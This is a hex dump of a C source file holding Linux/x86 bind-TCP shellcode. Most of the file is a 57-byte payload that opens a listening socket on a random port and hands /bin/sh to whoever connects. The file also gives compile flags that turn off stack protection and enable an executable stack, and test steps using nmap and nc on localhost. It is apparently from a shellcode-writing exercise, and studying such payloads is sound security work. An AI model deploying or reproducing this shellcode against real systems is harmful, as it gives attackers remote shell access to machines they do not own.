00000000  2f 2a 0a 0a 20 54 69 6e  79 20 53 68 65 6c 6c 20  |/*.. Tiny Shell |
00000010  42 69 6e 64 20 54 43 50  20 52 61 6e 64 6f 6d 20  |Bind TCP Random |
00000020  50 6f 72 74 20 53 68 65  6c 6c 63 6f 64 65 20 2d  |Port Shellcode -|
00000030  20 43 20 4c 61 6e 67 75  61 67 65 0a 20 4c 69 6e  | C Language. Lin|
00000040  75 78 2f 78 38 36 0a 0a  20 57 72 69 74 74 65 6e  |ux/x86.. Written|
00000050  20 69 6e 20 32 30 31 33  20 62 79 20 47 65 79 73  | in 2013 by Geys|
00000060  6c 61 6e 20 47 2e 20 42  65 6d 2c 20 48 61 63 6b  |lan G. Bem, Hack|
00000070  69 6e 67 20 62 69 74 73  0a 0a 20 20 20 68 74 74  |ing bits..   htt|
00000080  70 3a 2f 2f 68 61 63 6b  69 6e 67 62 69 74 73 2e  |p://hackingbits.|
00000090  63 6f 6d 0a 20 20 20 67  65 79 73 6c 61 6e 40 67  |com.   geyslan@g|
000000a0  6d 61 69 6c 2e 63 6f 6d  0a 0a 20 54 68 69 73 20  |mail.com.. This |
000000b0  73 6f 75 72 63 65 20 69  73 20 6c 69 63 65 6e 73  |source is licens|
000000c0  65 64 20 75 6e 64 65 72  20 74 68 65 20 43 72 65  |ed under the Cre|
000000d0  61 74 69 76 65 20 43 6f  6d 6d 6f 6e 73 0a 20 41  |ative Commons. A|
000000e0  74 74 72 69 62 75 74 69  6f 6e 2d 53 68 61 72 65  |ttribution-Share|
000000f0  41 6c 69 6b 65 20 33 2e  30 20 42 72 61 7a 69 6c  |Alike 3.0 Brazil|
00000100  20 4c 69 63 65 6e 73 65  2e 0a 0a 20 54 6f 20 76  | License... To v|
00000110  69 65 77 20 61 20 63 6f  70 79 20 6f 66 20 74 68  |iew a copy of th|
00000120  69 73 20 6c 69 63 65 6e  73 65 2c 20 76 69 73 69  |is license, visi|
00000130  74 0a 0a 20 20 20 68 74  74 70 3a 2f 2f 63 72 65  |t..   http://cre|
00000140  61 74 69 76 65 63 6f 6d  6d 6f 6e 73 2e 6f 72 67  |ativecommons.org|
00000150  2f 6c 69 63 65 6e 73 65  73 2f 62 79 2d 73 61 2f  |/licenses/by-sa/|
00000160  33 2e 30 2f 0a 0a 20 59  6f 75 20 61 72 65 20 66  |3.0/.. You are f|
00000170  72 65 65 3a 0a 0a 20 20  20 20 74 6f 20 53 68 61  |ree:..    to Sha|
00000180  72 65 20 2d 20 74 6f 20  63 6f 70 79 2c 20 64 69  |re - to copy, di|
00000190  73 74 72 69 62 75 74 65  20 61 6e 64 20 74 72 61  |stribute and tra|
000001a0  6e 73 6d 69 74 20 74 68  65 20 77 6f 72 6b 0a 20  |nsmit the work. |
000001b0  20 20 20 74 6f 20 52 65  6d 69 78 20 2d 20 74 6f  |   to Remix - to|
000001c0  20 61 64 61 70 74 20 74  68 65 20 77 6f 72 6b 0a  | adapt the work.|
000001d0  20 20 20 20 74 6f 20 6d  61 6b 65 20 63 6f 6d 6d  |    to make comm|
000001e0  65 72 63 69 61 6c 20 75  73 65 20 6f 66 20 74 68  |ercial use of th|
000001f0  65 20 77 6f 72 6b 0a 0a  20 55 6e 64 65 72 20 74  |e work.. Under t|
00000200  68 65 20 66 6f 6c 6c 6f  77 69 6e 67 20 63 6f 6e  |he following con|
00000210  64 69 74 69 6f 6e 73 3a  0a 20 20 20 41 74 74 72  |ditions:.   Attr|
00000220  69 62 75 74 69 6f 6e 20  2d 20 59 6f 75 20 6d 75  |ibution - You mu|
00000230  73 74 20 61 74 74 72 69  62 75 74 65 20 74 68 65  |st attribute the|
00000240  20 77 6f 72 6b 20 69 6e  20 74 68 65 20 6d 61 6e  | work in the man|
00000250  6e 65 72 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ner.            |
00000260  20 20 20 20 20 73 70 65  63 69 66 69 65 64 20 62  |     specified b|
00000270  79 20 74 68 65 20 61 75  74 68 6f 72 20 6f 72 20  |y the author or |
00000280  6c 69 63 65 6e 73 6f 72  20 28 62 75 74 0a 20 20  |licensor (but.  |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6e  |               n|
000002a0  6f 74 20 69 6e 20 61 6e  79 20 77 61 79 20 74 68  |ot in any way th|
000002b0  61 74 20 73 75 67 67 65  73 74 73 20 74 68 61 74  |at suggests that|
000002c0  20 74 68 65 79 0a 20 20  20 20 20 20 20 20 20 20  | they.          |
000002d0  20 20 20 20 20 20 20 65  6e 64 6f 72 73 65 20 79  |       endorse y|
000002e0  6f 75 20 6f 72 20 79 6f  75 72 20 75 73 65 20 6f  |ou or your use o|
000002f0  66 20 74 68 65 20 77 6f  72 6b 29 2e 0a 0a 20 20  |f the work)...  |
00000300  20 53 68 61 72 65 20 41  6c 69 6b 65 20 2d 20 49  | Share Alike - I|
00000310  66 20 79 6f 75 20 61 6c  74 65 72 2c 20 74 72 61  |f you alter, tra|
00000320  6e 73 66 6f 72 6d 2c 20  6f 72 20 62 75 69 6c 64  |nsform, or build|
00000330  20 75 70 6f 6e 0a 20 20  20 20 20 20 20 20 20 20  | upon.          |
00000340  20 20 20 20 20 20 20 74  68 69 73 20 77 6f 72 6b  |       this work|
00000350  2c 20 79 6f 75 20 6d 61  79 20 64 69 73 74 72 69  |, you may distri|
00000360  62 75 74 65 20 74 68 65  0a 20 20 20 20 20 20 20  |bute the.       |
00000370  20 20 20 20 20 20 20 20  20 20 72 65 73 75 6c 74  |          result|
00000380  69 6e 67 20 77 6f 72 6b  20 6f 6e 6c 79 20 75 6e  |ing work only un|
00000390  64 65 72 20 74 68 65 20  73 61 6d 65 20 6f 72 0a  |der the same or.|
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  20 73 69 6d 69 6c 61 72  20 6c 69 63 65 6e 73 65  | similar license|
000003c0  20 74 6f 20 74 68 69 73  20 6f 6e 65 2e 0a 0a 2a  | to this one...*|
000003d0  2f 0a 0a 2f 2a 0a 0a 20  74 69 6e 79 5f 73 68 65  |/../*.. tiny_she|
000003e0  6c 6c 5f 62 69 6e 64 5f  74 63 70 5f 72 61 6e 64  |ll_bind_tcp_rand|
000003f0  6f 6d 5f 70 6f 72 74 5f  73 68 65 6c 6c 63 6f 64  |om_port_shellcod|
00000400  65 0a 0a 20 2a 20 35 37  20 62 79 74 65 73 0a 20  |e.. * 57 bytes. |
00000410  2a 20 6e 75 6c 6c 2d 66  72 65 65 0a 0a 0a 20 23  |* null-free... #|
00000420  20 67 63 63 20 2d 6d 33  32 20 2d 66 6e 6f 2d 73  | gcc -m32 -fno-s|
00000430  74 61 63 6b 2d 70 72 6f  74 65 63 74 6f 72 20 2d  |tack-protector -|
00000440  7a 20 65 78 65 63 73 74  61 63 6b 20 74 69 6e 79  |z execstack tiny|
00000450  5f 73 68 65 6c 6c 5f 62  69 6e 64 5f 74 63 70 5f  |_shell_bind_tcp_|
00000460  72 61 6e 64 6f 6d 5f 70  6f 72 74 5f 73 68 65 6c  |random_port_shel|
00000470  6c 63 6f 64 65 2e 63 20  2d 6f 20 74 69 6e 79 5f  |lcode.c -o tiny_|
00000480  73 68 65 6c 6c 5f 62 69  6e 64 5f 74 63 70 5f 72  |shell_bind_tcp_r|
00000490  61 6e 64 6f 6d 5f 70 6f  72 74 5f 73 68 65 6c 6c  |andom_port_shell|
000004a0  63 6f 64 65 0a 0a 20 54  65 73 74 69 6e 67 0a 20  |code.. Testing. |
000004b0  23 20 2e 2f 74 69 6e 79  5f 73 68 65 6c 6c 5f 62  |# ./tiny_shell_b|
000004c0  69 6e 64 5f 74 63 70 5f  72 61 6e 64 6f 6d 5f 70  |ind_tcp_random_p|
000004d0  6f 72 74 5f 73 68 65 6c  6c 63 6f 64 65 0a 20 23  |ort_shellcode. #|
000004e0  20 6e 65 74 73 74 61 74  20 2d 61 6e 70 20 7c 20  | netstat -anp | |
000004f0  67 72 65 70 20 73 68 65  6c 6c 0a 20 23 20 6e 6d  |grep shell. # nm|
00000500  61 70 20 2d 73 53 20 31  32 37 2e 30 2e 30 2e 31  |ap -sS 127.0.0.1|
00000510  20 2d 70 2d 20 20 28 49  74 27 73 20 6e 65 63 65  | -p-  (It's nece|
00000520  73 73 61 72 79 20 74 6f  20 75 73 65 20 74 68 65  |ssary to use the|
00000530  20 54 43 50 20 53 59 4e  20 73 63 61 6e 20 6f 70  | TCP SYN scan op|
00000540  74 69 6f 6e 20 5b 2d 73  53 5d 3b 20 74 68 75 73  |tion [-sS]; thus|
00000550  20 61 76 6f 69 64 73 20  74 68 61 74 20 6e 6d 61  | avoids that nma|
00000560  70 20 63 6f 6e 6e 65 63  74 73 20 74 6f 20 74 68  |p connects to th|
00000570  24 0a 20 23 20 6e 63 20  31 32 37 2e 30 2e 30 2e  |$. # nc 127.0.0.|
00000580  31 20 70 6f 72 74 0a 0a  2a 2f 0a 0a 0a 23 69 6e  |1 port..*/...#in|
00000590  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0a  |clude <stdio.h>.|
000005a0  23 69 6e 63 6c 75 64 65  20 3c 73 74 72 69 6e 67  |#include <string|
000005b0  2e 68 3e 0a 0a 75 6e 73  69 67 6e 65 64 20 63 68  |.h>..unsigned ch|
000005c0  61 72 20 63 6f 64 65 5b  5d 20 3d 20 5c 0a 0a 22  |ar code[] = \.."|
000005d0  5c 78 33 31 5c 78 64 62  5c 78 66 37 5c 78 65 33  |\x31\xdb\xf7\xe3|
000005e0  5c 78 62 30 5c 78 36 36  5c 78 34 33 5c 78 35 32  |\xb0\x66\x43\x52|
000005f0  5c 78 35 33 5c 78 36 61  22 0a 22 5c 78 30 32 5c  |\x53\x6a"."\x02\|
00000600  78 38 39 5c 78 65 31 5c  78 63 64 5c 78 38 30 5c  |x89\xe1\xcd\x80\|
00000610  78 35 32 5c 78 35 30 5c  78 38 39 5c 78 65 31 5c  |x52\x50\x89\xe1\|
00000620  78 62 30 22 0a 22 5c 78  36 36 5c 78 62 33 5c 78  |xb0"."\x66\xb3\x|
00000630  30 34 5c 78 63 64 5c 78  38 30 5c 78 62 30 5c 78  |04\xcd\x80\xb0\x|
00000640  36 36 5c 78 34 33 5c 78  63 64 5c 78 38 30 22 0a  |66\x43\xcd\x80".|
00000650  22 5c 78 35 39 5c 78 39  33 5c 78 36 61 5c 78 33  |"\x59\x93\x6a\x3|
00000660  66 5c 78 35 38 5c 78 63  64 5c 78 38 30 5c 78 34  |f\x58\xcd\x80\x4|
00000670  39 5c 78 37 39 5c 78 66  38 22 0a 22 5c 78 62 30  |9\x79\xf8"."\xb0|
00000680  5c 78 30 62 5c 78 36 38  5c 78 32 66 5c 78 32 66  |\x0b\x68\x2f\x2f|
00000690  5c 78 37 33 5c 78 36 38  5c 78 36 38 5c 78 32 66  |\x73\x68\x68\x2f|
000006a0  5c 78 36 32 22 0a 22 5c  78 36 39 5c 78 36 65 5c  |\x62"."\x69\x6e\|
000006b0  78 38 39 5c 78 65 33 5c  78 34 31 5c 78 63 64 5c  |x89\xe3\x41\xcd\|
000006c0  78 38 30 22 3b 0a 0a 6d  61 69 6e 20 28 29 0a 7b  |x80";..main ().{|
000006d0  0a 0a 20 20 20 20 20 20  20 20 2f 2f 20 57 68 65  |..        // Whe|
000006e0  6e 20 74 68 65 20 50 6f  72 74 20 63 6f 6e 74 61  |n the Port conta|
000006f0  69 6e 73 20 6e 75 6c 6c  20 62 79 74 65 73 2c 20  |ins null bytes, |
00000700  70 72 69 6e 74 66 20 77  69 6c 6c 20 73 68 6f 77  |printf will show|
00000710  20 61 20 77 72 6f 6e 67  20 73 68 65 6c 6c 63 6f  | a wrong shellco|
00000720  64 65 20 6c 65 6e 67 74  68 2e 0a 0a 09 70 72 69  |de length....pri|
00000730  6e 74 66 28 22 53 68 65  6c 6c 63 6f 64 65 20 4c  |ntf("Shellcode L|
00000740  65 6e 67 74 68 3a 20 20  25 64 5c 6e 22 2c 20 73  |ength:  %d\n", s|
00000750  74 72 6c 65 6e 28 63 6f  64 65 29 29 3b 0a 0a 09  |trlen(code));...|
00000760  2f 2f 20 50 6f 6c 6c 75  74 65 73 20 61 6c 6c 20  |// Pollutes all |
00000770  72 65 67 69 73 74 65 72  73 20 65 6e 73 75 72 69  |registers ensuri|
00000780  6e 67 20 74 68 61 74 20  74 68 65 20 73 68 65 6c  |ng that the shel|
00000790  6c 63 6f 64 65 20 72 75  6e 73 20 69 6e 20 61 6e  |lcode runs in an|
000007a0  79 20 63 69 72 63 75 6d  73 74 61 6e 63 65 2e 0a  |y circumstance..|
000007b0  0a 09 5f 5f 61 73 6d 5f  5f 20 28 22 6d 6f 76 6c  |..__asm__ ("movl|
000007c0  20 24 30 78 66 66 66 66  66 66 66 66 2c 20 25 65  | $0xffffffff, %e|
000007d0  61 78 5c 6e 5c 74 22 0a  09 09 20 22 6d 6f 76 6c  |ax\n\t"... "movl|
000007e0  20 25 65 61 78 2c 20 25  65 62 78 5c 6e 5c 74 22  | %eax, %ebx\n\t"|
000007f0  0a 09 09 20 22 6d 6f 76  6c 20 25 65 61 78 2c 20  |... "movl %eax, |
00000800  25 65 63 78 5c 6e 5c 74  22 0a 09 09 20 22 6d 6f  |%ecx\n\t"... "mo|
00000810  76 6c 20 25 65 61 78 2c  20 25 65 64 78 5c 6e 5c  |vl %eax, %edx\n\|
00000820  74 22 0a 09 09 20 22 6d  6f 76 6c 20 25 65 61 78  |t"... "movl %eax|
00000830  2c 20 25 65 73 69 5c 6e  5c 74 22 0a 09 09 20 22  |, %esi\n\t"... "|
00000840  6d 6f 76 6c 20 25 65 61  78 2c 20 25 65 64 69 5c  |movl %eax, %edi\|
00000850  6e 5c 74 22 0a 09 09 20  22 6d 6f 76 6c 20 25 65  |n\t"... "movl %e|
00000860  61 78 2c 20 25 65 62 70  5c 6e 5c 74 22 0a 0a 09  |ax, %ebp\n\t"...|
00000870  2f 2f 20 43 61 6c 6c 69  6e 67 20 74 68 65 20 73  |// Calling the s|
00000880  68 65 6c 6c 63 6f 64 65  0a 09 09 20 22 63 61 6c  |hellcode... "cal|
00000890  6c 20 63 6f 64 65 22 29  3b 0a 0a 7d              |l code");..}|
0000089c
